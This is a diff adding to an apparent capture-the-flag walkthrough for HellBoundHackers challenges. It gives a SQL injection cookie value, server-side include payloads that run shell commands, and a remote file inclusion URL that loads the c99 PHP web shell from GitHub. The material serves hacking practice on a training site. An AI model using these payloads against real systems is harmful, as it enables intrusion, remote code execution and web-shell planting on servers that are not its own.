@@ -160,3 +160,34 @@ void(document.cookie="whoami=fire");
 
 Set the cookie to `admin` and you will see a different error message. It gives a hint that it wants you to poison the cookie with some sql stuff - throw in the classic ' OR 1=1-- to the cookie to pass the challenge.
 
+## Basic 22
+This challenge focuses on server-side includes. A good primer is available from OWASP: https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection
+
+This challenge cares about formatting and slashes. First verify that the command field is vulnerable:
+```
+<!--#exec cmd="ls" -->
+```
+This will display the current directory. Next, view the form on the page to see that it is posting to "secretdir/secure.php". Use this directory in a command:
+```
+<!--#exec cmd="ls secretdir/" -->
+```
+This will give the name of a file with the password in it. Simply view that file to get your admin password:
+https://www.hellboundhackers.org/challenges/basic22/secretdir/passfilebasic.php
+
+## Basic 23
+This challenge focuses on remote file inclusion. A good primer is available from OWASP: https://www.owasp.org/index.php/Testing_for_Remote_File_Inclusion
+
+We can easily verify this site is vulnerable by using google as a test:
+```
+https://www.hellboundhackers.org/challenges/basic23/site/show.php?page=http://google.com
+```
+To exploit this, we need to upload a shell on the server. We can get an example shell from the following github link:
+```
+https://raw.githubusercontent.com/Snifer/L4bsForShell/master/PHP/c99.txt
+```
+Throw this link in the challenge, like so:
+```
+https://www.hellboundhackers.org/challenges/basic23/site/show.php?page=http://raw.githubusercontent.com/Snifer/L4bsForShell/master/PHP/c99.txt
+```
+On a real assessment, this would then return a shell to the target that you could access.
+
